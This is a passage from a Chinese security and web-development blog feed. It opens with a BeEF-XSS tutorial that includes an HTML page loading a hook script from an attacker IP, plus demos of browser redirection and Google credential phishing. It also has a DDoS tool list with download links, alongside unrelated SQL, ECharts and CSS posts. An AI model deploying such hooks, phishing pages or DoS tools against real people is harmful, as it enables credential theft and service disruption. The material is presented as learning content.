方法二：执行命令<code>beef-xss</code> kali已经把beef-xss做成服务了，我们也可以使用systemctl 命令来启动或关闭beef服务</p><pre><code class="hljs shell">systemctl start beef-xss.service         #开启beef服务systemctl stop beef-xss.service         #关闭beef服务systemctl restart beef-xss.service      #重启beef服务</code></pre><p>Shell</p><p><img src="https://niu.bbskali.cn/598c335560fe6f6affc8114788ea4f72" alt="请输入图片描述" title="请输入图片描述"> <strong>注意：</strong>初次配置要求我们输入我们的账号和密码（自行设定） 启动完成后，会自动跳转到浏览器的管理页面。输入我们刚才设置的账号和密码，登入系统。初始账号和密码均为<code>beef</code> <img src="https://niu.bbskali.cn/472b85a471f332b8176e66d4c488079e" alt="请输入图片描述" title="请输入图片描述"></p><h3 id="配置我们的钩子"><a href="#配置我们的钩子" class="headerlink" title="配置我们的钩子"></a>配置我们的钩子</h3><p>方法有两种这里简单说下： 方法一：找含有xss漏洞的网站，插入js达到攻击目标。 方法二：自己写一个含有毒化的网页，让他人访问。（内网+外网） 这里以方法二为列：写个简单的页面。</p><pre><code class="hljs html"><span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;utf-8&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>啦啦啦<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>bbskali.cn<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://192.168.0.114:3000/hook.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>HTML</p><p>也就是说，想办法让别人访问我刚才写的这个页面。即可达到攻击的目标。方法比较多，如中间人攻击，重定向，挂黑页等等。</p><h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><h4 id="演示一-（设备上线）"><a href="#演示一-（设备上线）" class="headerlink" title="演示一 （设备上线）"></a>演示一 （设备上线）</h4><p>当攻击端访问我们的网页，在<code>beef</code>控制台中我们就可以看到上线的设备。 <img src="https://niu.bbskali.cn/7a06f40561d103c523ce1845af305705" alt="请输入图片描述" title="请输入图片描述"></p><h3 id="设备攻击"><a href="#设备攻击" class="headerlink" title="设备攻击"></a>设备攻击</h3><p>点击我们的设备，选择<code>commands</code>选项卡，我们可以看到有很多攻击模块。 <img src="https://niu.bbskali.cn/ca9a915081a8a15bf3f4ce03e01d0171" alt="请输入图片描述" title="请输入图片描述"></p><p>读者可能发现在每个模块的前面都有一个有色（绿色，灰色，橙色，红色）的小圆标志。</p><p>在内部，BeEF可以检测出哪些命令模块可以在当前受害的浏览器工作， 并用颜色表示：</p><p><code>绿色</code>：命令模块可以在目标浏览器上运行，且用户不会感到任何异常</p><p><code>橙色</code>：命令模块可以在目标浏览器上运行，但是用户可能会感到异常（比如可能会有弹窗，提示，跳转等）</p><p><code>灰色</code>：命令模块尚未针对此目标进行验证，即不知道能否可运行</p><p><code>红色</code>：命令模块不适用于此目标 这里给大家演示几个模块。其他的大家自己自娱自乐！</p><h4 id="让浏览器自动访问指定的网站"><a href="#让浏览器自动访问指定的网站" class="headerlink" title="让浏览器自动访问指定的网站"></a>让浏览器自动访问指定的网站</h4><p>点击<code>Browser</code>--<code>hooked Doman</code> –<code>Redirect Browser</code>输入我们的目标网址后点击<code>Execute</code>即可完成攻击。返回到刚才打开的页面，发现自动跳转到了kali论坛。</p><p><img src="https://niu.bbskali.cn/9976f202e77c74dacc3dba8ac8679c91" alt="请输入图片描述" title="请输入图片描述"></p><h4 id="弹出对话框"><a href="#弹出对话框" class="headerlink" title="弹出对话框"></a>弹出对话框</h4><p>点击<code>Browser</code>--<code>hooked Doman</code> –<code>Create Alert Dialog</code>输入我们要弹出的信息后点击<code>Execute</code>即可完成攻击。 <img src="https://niu.bbskali.cn/88fc4b7f5138e3c7c9139aabcfd61526" alt="请输入图片描述" title="请输入图片描述"> 效果如下： <img src="https://niu.bbskali.cn/ff70451cce093d43031a9d67c32df77e" alt="请输入图片描述" title="请输入图片描述"></p><h4 id="弹出输入信息框"><a href="#弹出输入信息框" class="headerlink" title="弹出输入信息框"></a>弹出输入信息框</h4><p>点击<code>Browser</code>--<code>hooked Doman</code> –<code>Create Prompt Dialog</code>输入我们要弹出的信息后点击<code>Execute</code>即可完成攻击。 <img src="https://niu.bbskali.cn/5128ca60794bf945178536329b0cf681" alt="请输入图片描述" title="请输入图片描述"> 同样的方式，当我们输入信息后，即可在管理面板看到刚才输入的信息！ <img src="https://niu.bbskali.cn/03813c3d4542cfb37d7197191d7adc93" alt="请输入图片描述" title="请输入图片描述"> 结果： <img src="https://niu.bbskali.cn/bdb3a1135198637b3ce92a7d9a168630" alt="请输入图片描述" title="请输入图片描述"></p><h4 id="制作钓鱼网站"><a href="#制作钓鱼网站" class="headerlink" title="制作钓鱼网站"></a>制作钓鱼网站</h4><p>选择<code>Scoial Engineering</code>--<code>Google phishing</code>改为我们kali的ip地址。点击<code>Execute</code> <img src="https://niu.bbskali.cn/a24799830939026091d043d3ea2f050c" alt="请输入图片描述" title="请输入图片描述"> 我们的页面变成了google的登录页面 <img src="https://niu.bbskali.cn/52d2192e6f7fac9b8b6dd90ae4f20a08" alt="请输入图片描述" title="请输入图片描述"></p><p>输入我们的账号和密码 <img src="https://niu.bbskali.cn/aceb288127732f06aa848c8ea568827c" alt="请输入图片描述" title="请输入图片描述"> 获取到的密码</p><p><img src="https://niu.bbskali.cn/3e26c400e5e0594df8460f005cf18a33" alt="请输入图片描述" title="请输入图片描述"></p><p>转载</p><p>版权属于：逍遥子</p><p>本文链接：<a href="https://blog.bbskali.cn/index.php/archives/1366/">https://blog.bbskali.cn/index.php/archives/1366/</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>sql自定义函数传参去掉一个最高分一个最低分</title>
    <link href="/2019/07/23/sql%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E5%8E%BB%E6%8E%89%E4%B8%80%E4%B8%AA%E6%9C%80%E9%AB%98%E5%88%86%E4%B8%80%E4%B8%AA%E6%9C%80%E4%BD%8E%E5%88%86/index/"/>
    <url>/2019/07/23/sql%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82%E5%8E%BB%E6%8E%89%E4%B8%80%E4%B8%AA%E6%9C%80%E9%AB%98%E5%88%86%E4%B8%80%E4%B8%AA%E6%9C%80%E4%BD%8E%E5%88%86/index/</url>
    
    <content type="html"><![CDATA[<p>CREATE FUNCTION CalculateAverage(@参数1 bigint,@参数2 bigint) returns int – 设置返回值，记住是 returns 而不是 return AS BEGIN DECLARE @result varchar(50) DECLARE @Average int SET @result = (select count (分数) from 数据库名 where 数据库字段1= @Project and 数据库字段2= @ProjectReview GROUP BY 数据库字段1,数据库字段2    –若不加group by 会报错 IF @result &lt; 3 BEGIN SET @Average = (select round(AVG(分数),0) from 数据库名 where 数据库字段1= @Project and 数据库字段2= @ProjectReview GROUP BY数据库字段1,数据库字段2) END ELSE BEGIN SET @Average = (select AVG(IEVScore) from 数据库名 where Pkey not in ( select top 1 Pkey from 数据库名order by 分数 union all select top 1 Pkey from 数据库名order by 分数desc ) and 数据库字段1= @Project and 数据库字段2= @ProjectReview GROUP BY 数据库字段1,数据库字段2) END return @Average – 返回结果 END</p>]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>kali linux 安装google浏览器之后不能打开的问题</title>
    <link href="/2019/07/22/kali-linux-%E5%AE%89%E8%A3%85google%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%8B%E5%90%8E%E4%B8%8D%E8%83%BD%E6%89%93%E5%BC%80%E7%9A%84%E9%97%AE%E9%A2%98/index/"/>
    <url>/2019/07/22/kali-linux-%E5%AE%89%E8%A3%85google%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B9%8B%E5%90%8E%E4%B8%8D%E8%83%BD%E6%89%93%E5%BC%80%E7%9A%84%E9%97%AE%E9%A2%98/index/</url>
    
    <content type="html"><![CDATA[<p>我又碰到了一堆傻子，zz复制粘贴了一些方法，踏马的，自己都不试验一下就瞎扯一通，就好比这个智障:</p><p> </p><p><img src="images/17124567-1c4f224c7787c619.png"></p><p>哪有这傻子说的什么命令的东西，真的是，你最起码测测再发啊</p><p>亲测下面这个好使：</p><p>在终端上输入下面的语句：google-chrome-stable –no-sandbox</p><p>系统弹出界面，点击确认之后就自动打开了，亲测好使</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>使用钟馗之眼进行信息收集</title>
    <link href="/2019/07/19/%E4%BD%BF%E7%94%A8%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index/"/>
    <url>/2019/07/19/%E4%BD%BF%E7%94%A8%E9%92%9F%E9%A6%97%E4%B9%8B%E7%9C%BC%E8%BF%9B%E8%A1%8C%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/index/</url>
    
    <content type="html"><![CDATA[<h2 id="钟馗之眼搜索小技巧"><a href="#钟馗之眼搜索小技巧" class="headerlink" title="钟馗之眼搜索小技巧"></a>钟馗之眼搜索小技巧</h2><p><strong>搜索指定的组建</strong></p><p>例如：搜索apache</p><p>app:apache</p><p><strong>搜索指定的组建加版本</strong></p><p>例如：搜索apache 2.4</p><p>app:apache var 2.4</p><p><strong>搜索指定的界面</strong></p><p>例如：搜索index.php</p><p>直接index.php</p><p><strong>搜索指定的国家</strong></p><p>例如：搜索国家越南</p><p>country:“VN”</p><p><strong>搜索指定城市</strong></p><p>例如：北京</p><p>city:”beijing”</p><p><strong>搜索指定的端口</strong></p><p>例如：搜索21</p><p>port:21</p><p><strong>关键字搜索</strong></p><p>例如：搜索电子科技大学</p><p>keyword:电子科技大学</p><p>也可以直接输入不加keyword</p><p><strong>搜索指定设备</strong></p><p>例如：搜索路由设备</p><p>device:route</p><p><strong>搜索指定网址</strong></p><p>例如：搜索百度</p><p>site:<a href="http://www.baidu.com/">www.baidu.com</a></p><p><strong>搜索指定主机</strong></p><p>例如：搜索my.e-court.gov.cn</p><p>hostname:my.e-court.gov.cn</p><p><strong>搜索指定网段</strong></p><p>例如：搜索100.100.100.100/24</p><p>cidr:100.100.100.100/24</p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>十大渗透测试工具</title>
    <link href="/2019/07/16/%E5%8D%81%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/index/"/>
    <url>/2019/07/16/%E5%8D%81%E5%A4%A7%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/index/</url>
    
    <content type="html"><![CDATA[<p><strong>仅用于学习使用，禁止用于非法用途！！！</strong></p><p>作为一个半吊子的渗透测试工程师，怎么能没有工具呢，下面介绍十款渗透测试工具，注意：<strong>仅用于学习使用，禁止用于非法用途！！！</strong></p><h1 id="1、Nmap"><a href="#1、Nmap" class="headerlink" title="1、Nmap"></a>1、Nmap</h1><p>Nmap（Network Mapper）是一款非常著名的、用来扫描端口和绘制网络的、开源免费的黑客工具，它是一个基于控制台的工具，另外方便使用，还有一个带有GUI的版本Zenmap。Nmap被世界各地的安全专业人员用于绘制网络空间，检查开放的端口，管理服务的升级计划，监控主机或服务的正常运行时间。</p><p>nmap主要用于网络发现和执行安全审计。它使用原始IP数据包以创造性的方式来确定哪些主机在网络上可用，收集主机提供了哪些服务及其相关信息（应用程序名称和版本），使用的是什么操作系统，目标主机的过滤器/防火墙允许什么类型、什么版本的数据包穿过。</p><h1 id="2、Metasploit"><a href="#2、Metasploit" class="headerlink" title="2、Metasploit"></a>2、Metasploit</h1><p>Metasploit是一个漏洞利用工具，可以用来执行各种各样的任务，它是网络安全专业人员和白帽黑客必不可少的工具。同时它是最著名的一个开源框架，可用于开发和执行针对远程目标机器的POC的工具。Metasploit本质上是为用户提供关于已知的安全漏洞的关键信息，帮助制定渗透测试、系统测试计划、漏洞利用的策略和方法。</p><h1 id="3、John-the-Ripper"><a href="#3、John-the-Ripper" class="headerlink" title="3、John the Ripper"></a>3、John the Ripper</h1><p>John the Ripper是一个受欢迎的密码破解渗透测试工具，最常用于进行字典攻击。John the Ripper以文本字符串的样本（也称为“字典表”，包括常用和复杂的组合密码）为基础，并以与待破解密码同样的方式（包括加密算法和密钥）进行加密，并输出加密字符串，与真正密码进行比较。该工具还可以用于对字典库进行各种变形。</p><p>另一个和John the Ripper类似的工具是THC Hydra（九头蛇）。John the Ripper和THC之间唯一的区别是，John the Ripper是一个离线的密码破解器，而九头蛇是一个“在线”的破解工具。</p><h1 id="4、THC-Hydra"><a href="#4、THC-Hydra" class="headerlink" title="4、THC Hydra"></a>4、THC Hydra</h1><p>THC Hydra是一个非常受欢迎的密码破解工具，并且有一个非常活跃和经验丰富的开发团队在维护，支持Windows，Linux，Free BSD，Solaris和OS X等操作系统。THC Hydra是一个快速稳定的网络登录攻击工具，它将使用字典或暴力攻击来尝试针对登录页面的各种密码和登录组合。当你需要强力破解远程认证服务时，THC Hydra常常是个不二选择工具。它可以对超过50个协议执行高效的字典攻击，包括telnet、FTP、HTTP、HTTPS、SMB、多种类型的数据库，等等。您可以轻松添加模块到该工具中，以此增强功能。</p><h1 id="5、OWASP-Zed"><a href="#5、OWASP-Zed" class="headerlink" title="5、OWASP Zed"></a>5、OWASP Zed</h1><p>OWASP Zed代理攻击（简称：ZAP）是一个非常流行的Web应用程序渗透测试工具，用于发现应用漏洞。它既可以被具有丰富经验的安全专家所用，同时对于开发人员和功能测试人员来说也是非常理想的测试工具箱。</p><p>ZAP是一个流行的工具，因为它也有很多的支持者，并且OWASP社区也是一个为那些网络安全工作人员提供优秀资源的社区。ZAP提供自动扫描器以及其他各种工具，用于发现安全漏洞。理解和精通这个工具有利于你在渗透测试领域的职业生涯提升。</p><h1 id="6、Wireshark"><a href="#6、Wireshark" class="headerlink" title="6、Wireshark"></a>6、Wireshark</h1><p>Wireshark是一个非常流行的网络协议分析器工具，它可以用于检查办公网络或家庭网络中的各种东西。您可以实时捕获数据包并分析数据包以找到与网络相关的各种信息。该工具支持Windows，Linux，OS X，Solaris，FreeBSD和其他平台。</p><p>Wireshark已经高度发达，它包括过滤器，彩色标注等细节功能，让用户深入了解网络流量和检查每个数据包。如果你想成为一个渗透测试相关工作或者作为一个网络安全从业者，学习如何使用Wireshark是必不可缺的。</p><h1 id="7、Aircrack-ng"><a href="#7、Aircrack-ng" class="headerlink" title="7、Aircrack-ng"></a>7、Aircrack-ng</h1><p>Aircrack-ng是一个无线攻击工具，其之所有上榜是因为它具有强有力的无线网络密码的破解能力。这是一个用于802.11协议簇中WEP协议和WPA-PSK协议的密钥破解工具，它只要在监控模式下抓取足够的数据包，就可以恢复密钥。我们知道aircrack-ng提供标准的FMS攻击和优化了的Korek攻击，结合PTW攻击可使他们的攻击更有效。对于那些对无线攻击感兴趣的人来说，这是一个强烈推荐的工具。无线审计和渗透测试，学习Aircrack是必不可少的。</p><h1 id="8、Maltego"><a href="#8、Maltego" class="headerlink" title="8、Maltego"></a>8、Maltego</h1><p>Maltego是数字取证工具，为企业网络或局域网络提供一个整体的网络运行情况和网络威胁画像。Maltego核心功能是分析真实世界中可触及的公开互联网信息之间的关系，包括“踩点”互联网基础设施以及收集拥有这些设施的企业组织和个人信息。</p><p>Maltego提供一个范围广泛的图形化界面，通过聚合信息可即时准确地看到各个对象之间的关系，这使得我们可以看到隐藏的关联，即使它们是三重或四重的分离关系。</p><h1 id="9、Cain-and-Abel"><a href="#9、Cain-and-Abel" class="headerlink" title="9、Cain and Abel"></a>9、Cain and Abel</h1><p>Cain&amp;Abel是微软操作系统的密码复原工具，通过嗅探网络它可轻易地复原各种密码，使用字典、暴力、密码分析破解加密密码，记录VoIP通话记录，解码加密的密码，恢复无线网络密钥，发现缓存密码、分析路由协议。</p><p>开发Cain&amp;Abel的本意，是希望它能对网络管理员、教师、安全顾问/专业人员、法医工作人员、安全软件供应商、专业渗透测试人员等提供帮助。</p><h1 id="10、Nikto-Website-Vulnerability-Scanner"><a href="#10、Nikto-Website-Vulnerability-Scanner" class="headerlink" title="10、Nikto Website Vulnerability Scanner"></a>10、Nikto Website Vulnerability Scanner</h1><p>Nikto是另一个经典的黑客工具，它是一个开源的（GPL）Web服务器扫描工具，综合扫描web服务器中的潜在危险的文件、CGI、版本检查、特定版本的问题、服务器配置项。被扫描项目和插件可以进行自动更新。</p><p>Nikto也可以检查服务器配置项，比如多索引文件的存在，HTTP服务选项，该工具还可标识已安装的Web服务器和Web应用程序。Nikto也算是半个IDS工具了，所以它是在进行白帽渗透测试或白盒渗透测试时是非常有用的。</p><blockquote><p>　黑客工具也不仅限于以上讨论的那些，不同个人或团队都有不同的偏好。然而，这些都是被专业人士推荐的最受欢迎的工具。而且，所有这些工具都被集成在用于渗透测试的Linux发行版，如Kali Linux或Back Box系统，因此大家都极力推荐你安装一个合适的、能够自动更新工具库的、集成众多黑客工具的Linux工具箱了。还有burp等一些神器没有介绍，欢迎联系我补充</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>免费DDOS攻击测试工具</title>
    <link href="/2019/07/14/%E5%85%8D%E8%B4%B9ddos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/index/"/>
    <url>/2019/07/14/%E5%85%8D%E8%B4%B9ddos%E6%94%BB%E5%87%BB%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7/index/</url>
    
    <content type="html"><![CDATA[<p><strong>仅用于攻防演练及教学测试用途，禁止非法使用！！！！！！</strong></p><p><strong>1、卢瓦(LOIC) (Low Orbit Ion Canon)</strong></p><p>LOTC是一个最受欢迎的DOS攻击工具。 这个工具被去年流行的黑客集团匿名者用于对许多大公司的网络攻击。</p><p>它可以通过使用单个用户执行DOS攻击小型服务器，工具非常易于使用，即便你是一个初学者。 这个工具执行DOS攻击通过发送UDP,TCP或HTTP请求到受害者服务器。 你只需要知道服务器的IP地址或URL，其他的就交给这个工具吧。</p><p><img src="https://image.3001.net/images/20140614/14027347864477.png!small" alt="DDOS攻击测试"></p><p>下载卢瓦LOIC: <a href="http://sourceforge.net/projects/loic/">http://sourceforge.net/projects/loic/</a></p><p><strong>2、XOIC</strong> </p><p>XOIC是另一个不错的DOS攻击工具。它根据用户选择的端口与协议执行DOS攻击任何服务器。XOIC开发者还声称XOIC比上面的LOIC在很多方面更强大呢。</p><p><img src="https://image.3001.net/images/20140614/14027348029797.jpg!small" alt="DDOS攻击测试"></p><p>一般来说,该工具有三种攻击模式,第一个被称为测试模式，是非常基本的； 第二个是正常的DOS攻击模式； 最后一个是带有HTTP / TCP / UDP / ICMP消息的DOS攻击模式,。</p><p>对付小型网站来说，这是一个很有效的DDOS工具。 但是从来没有尝试的要小心点，你可能最终会撞自己的网站的服务器。</p><p>下载XOIC: <a href="http://sourceforge.net/projects/xoic/">http://sourceforge.net/projects/xoic/</a></p><p><strong>3、HULK (HTTP Unbearable Load King)</strong></p><p>HULK是另一个不错的DOS攻击工具，这个工具使用某些其他技术来避免通过攻击来检测。它有一个已知的用户代理列表，且使用的是随机请求。</p><p>在这里下载HULK: <a href="http://packetstormsecurity.com/files/112856/HULK-Http-Unbearable-Load-King.html">http://packetstormsecurity.com/files/112856/HULK-Http-Unbearable-Load-King.html</a></p><p><strong>4、 DDOSIM-Layer</strong> </p><p>DDOSIM是另一种流行的DOS攻击工具。 顾名思义,它是通过模拟控制几个僵尸主机执行DDOS攻击。所有僵尸主机创建完整的TCP连接到目标服务器。</p><p>这个工具是用c++写的,并且在Linux系统上运行。</p><p>这些是DDOSIM的主要特点：</p><pre><code class="hljs armasm">模拟几个僵尸攻击 随机的<span class="hljs-built_in">IP</span>地址 <span class="hljs-symbol">TCP</span>-connection-based攻击 应用程序层DDOS攻击 <span class="hljs-symbol">HTTP</span> DDos等有效的请求 与无效请求HTTP DDoS(类似于直流+ +攻击) <span class="hljs-symbol">SMTP</span> DDoS <span class="hljs-symbol">TCP</span>洪水连接随机端口</code></pre><p>在这里下载DDOSIM: <a href="http://sourceforge.net/projects/ddosim/">http://sourceforge.net/projects/ddosim/</a></p><p>阅读更多关于此工具: <a href="http://stormsecurity.wordpress.com/2009/03/03/application-layer-ddos-simulator/">http://stormsecurity.wordpress.com/2009/03/03/application-layer-ddos-simulator/</a></p><p><strong>5、R-U-Dead-Yet</strong> </p><p>R-U-Dead-Yet是一个HTTP post DOS攻击工具。它执行一个DOS攻击长表单字段，通过POST方法提交。 这个工具提供了一个交互式控制台菜单，检测给定的URL,并允许用户选择哪些表格和字段应用于POST-based DOS攻击。</p><p>下载: <a href="https://code.google.com/p/r-u-dead-yet/">https://code.google.com/p/r-u-dead-yet/</a></p><p><strong>6、 Tor&#039;s hammer</strong></p><p>Tor&#039;hammer是另一个不错的DOS测试工具。 它是用Python编写的。 这个工具有一个额外的优势:它可以通过TOR匿名网络执行攻击。 这是一个非常有效的工具,它可以在几秒内杀了Apache和IIS服务器。</p><p>下载TOR&#039;Hummer: <a href="http://packetstormsecurity.com/files/98831/">http://packetstormsecurity.com/files/98831/</a></p><p><strong>7、 PyLoris</strong> </p><p>据说PyLoris是服务器的测试工具。它也可以用来执行DOS攻击。 这个工具可以利用 SOCKS代理和SSL连接服务器上执行DOS攻击。它可以针对各种协议,包括HTTP、FTP、SMTP、IMAP,Telnet。不像其他传统DOS攻击工具一样，其最新版本的软件添加了一个简单易用的GUI。</p><p>下载PyLoris: <a href="http://sourceforge.net/projects/pyloris/">http://sourceforge.net/projects/pyloris/</a></p><p><strong>8、OWASP DOS HTTP POST</strong> </p><p>这是另外一个很好的工具。您可以使用这个工具来检查您的web服务器能否够捍卫得住别人的DOS攻击。当然，不仅对防御，它也可以用来执行DOS攻击哦。</p><p>下载: <a href="https://code.google.com/p/owasp-dos-http-post/">https://code.google.com/p/owasp-dos-http-post/</a></p><p><strong>9、DAVOSET</strong> </p><p>DAVOSET是另一个很好的执行DDOS攻击工具。 最新版本的工具新增支持cookie以及许多其他功能。 您可以从Packetstormsecurity DAVOSET免费下载。</p><p>下载DavoSET: <a href="http://packetstormsecurity.com/files/123084/DAVOSET-1.1.3.html">http://packetstormsecurity.com/files/123084/DAVOSET-1.1.3.html</a></p><p><strong>10、黄金眼（GoldenEye ）HTTP拒绝服务工具</strong> </p><p>黄金眼也是一个简单但有效的DOS攻击工具。 这是在Python测试开发的DOS攻击,但是人们也把它当做一种黑客工具了。</p><p>下载: <a href="http://packetstormsecurity.com/files/120966/GoldenEye-HTTP-Denial-Of-Service-Tool.html">http://packetstormsecurity.com/files/120966/GoldenEye-HTTP-Denial-Of-Service-Tool.html</a></p>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>echart的简单使用</title>
    <link href="/2019/07/12/echart%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/index/"/>
    <url>/2019/07/12/echart%E7%9A%84%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8/index/</url>
    
    <content type="html"><![CDATA[<p>需要引入的js:</p><script src="../js/echarts.js"></script> html只有一个div就可以：<div id="main" style="width: 600px;height:400px;"></div> 1.柱状图 // 基于准备好的dom，初始化echarts实例 var myChart = echarts.init(document.getElementById('main'));<p>// 指定图表的配置项和数据 var option = { title: { text: ‘ECharts 入门示例’ }, tooltip: {}, //提示框组件 legend: { //图例组件 data:[‘销量’] //图例的数据数组。数组项通常为一个字符串，每一项代表一个系列的 name }, xAxis: { //直角坐标系 grid 中的 x 轴 data: [“衬衫”,”羊毛衫”,”雪纺衫”,”裤子”,”高跟鞋”,”袜子11”] }, yAxis: {}, series: [{ //系列列表 name: ‘销量’, //系列名称，用于tooltip的显示，legend 的图例筛选 type: ‘bar’, //类型 data: data //系列中的数据内容数组。数组项通常为具体的数据项 }] };</p><p> </p><p>2.饼状图 var myChart = echarts.init(document.getElementById(‘main’)); option = { title : { text: ‘某站点用户访问来源’, //大标题 subtext: ‘纯属虚构’, //类似于副标题 x:’center’ //标题位置 居中 }, tooltip : { trigger: ‘item’, //数据项图形触发，主要在散点图，饼图等无类目轴的图表中使用。 formatter: “{a} <br>{b} : {c} ({d}%)” //{a}（系列名称），{b}（数据项名称），{c}（数值）, {d}（百分比）用于鼠标悬浮时对应的显示格式和内容 }, legend: { //图例组件。 orient: ‘vertical’, //图例列表的布局朝向 left: ‘left’, data: [‘直接访问’,’邮件营销’,’联盟广告’,’视频广告’,’搜索引擎’] }, series : [ //系列列表。每个系列通过 type 决定自己的图表类型 { name: ‘访问来源’, type: ‘pie’, radius : ‘55%’, center: [‘50%’, ‘60%’], data:[ {value:335, name:’直接访问’}, {value:310, name:’邮件营销’}, {value:234, name:’联盟广告’}, {value:135, name:’视频广告’}, {value:1548, name:’搜索引擎’} ], itemStyle: { emphasis: { shadowBlur: 10, shadowOffsetX: 0, shadowColor: ‘rgba(0, 0, 0, 0.5)’ } } } ] }; myChart.setOption(option);</p>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>定位</title>
    <link href="/2019/07/09/%E5%AE%9A%E4%BD%8D/index/"/>
    <url>/2019/07/09/%E5%AE%9A%E4%BD%8D/index/</url>
    
    <content type="html"><![CDATA[<table><colgroup><col><col></colgroup><tbody><tr><td data-cell-id="9781-1562894520932-cell-0-0"><div class="table-cell-line">absolute</div></td><td data-cell-id="9781-1562894520932-cell-0-1"><div class="table-cell-line">生成绝对定位的元素，相对于 static 定位以外的第一个父元素进行定位。</div><div class="table-cell-line">元素的位置通过 "left", "top", "right" 以及 "bottom" 属性进行规定。</div></td></tr><tr><td data-cell-id="9781-1562894520932-cell-1-0"><div class="table-cell-line">fixed</div></td><td data-cell-id="9781-1562894520932-cell-1-1"><div class="table-cell-line">生成固定定位的元素，相对于浏览器窗口进行定位。</div><div class="table-cell-line">元素的位置通过 "left", "top", "right" 以及 "bottom" 属性进行规定。</div></td></tr><tr><td data-cell-id="9781-1562894520932-cell-2-0"><div class="table-cell-line">relative</div></td><td data-cell-id="9781-1562894520932-cell-2-1"><div class="table-cell-line">生成相对定位的元素，相对于其正常位置进行定位。</div><div class="table-cell-line">因此，"left:20" 会向元素的 LEFT 位置添加 20 像素。</div></td></tr><tr><td data-cell-id="9781-1562894520932-cell-3-0"><div class="table-cell-line">static</div></td><td data-cell-id="9781-1562894520932-cell-3-1"><div class="table-cell-line">默认值。没有定位，元素出现在正常的流中（忽略 top, bottom, left, right 或者 z-index 声明）。</div></td></tr><tr><td data-cell-id="9781-1562894520932-cell-4-0"><div class="table-cell-line">sticky</div></td><td data-cell-id="9781-1562894520932-cell-4-1"><div class="table-cell-line">粘性定位，该定位基于用户滚动的位置。</div><div class="table-cell-line">它的行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置。</div><div class="table-cell-line">注意:&nbsp;Internet Explorer, Edge 15 及更早 IE 版本不支持 sticky 定位。 Safari 需要使用 -webkit- prefix (查看以下实例)。</div></td></tr><tr><td data-cell-id="9781-1562894520932-cell-5-0"><div class="table-cell-line">inherit</div></td><td data-cell-id="9781-1562894520932-cell-5-1"><div class="table-cell-line">规定应该从父元素继承 position 属性的值。</div></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>前端</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>laydate 日期插件弹出闪退和多次闪退问题解决</title>
    <link href="/2019/07/06/laydate-%E6%97%A5%E6%9C%9F%E6%8F%92%E4%BB%B6%E5%BC%B9%E5%87%BA%E9%97%AA%E9%80%80%E5%92%8C%E5%A4%9A%E6%AC%A1%E9%97%AA%E9%80%80%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/index/"/>
    <url>/2019/07/06/laydate-%E6%97%A5%E6%9C%9F%E6%8F%92%E4%BB%B6%E5%BC%B9%E5%87%BA%E9%97%AA%E9%80%80%E5%92%8C%E5%A4%9A%E6%AC%A1%E9%97%AA%E9%80%80%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/index/</url>
    
    <content type="html"><![CDATA[<p>var allDate = $(document).find(‘.layer-date’)</p><p>allDate.each(function(index, el) { $(this).removeAttr(“lay-key”)   解决重复关闭模态框后再次点击闪退问题 laydate.render({ elem: this,解决多次打开模态框闪退问题 format: ‘yyyy-MM-dd’ }); });</p>]]></content>
    
    
    <categories>
      
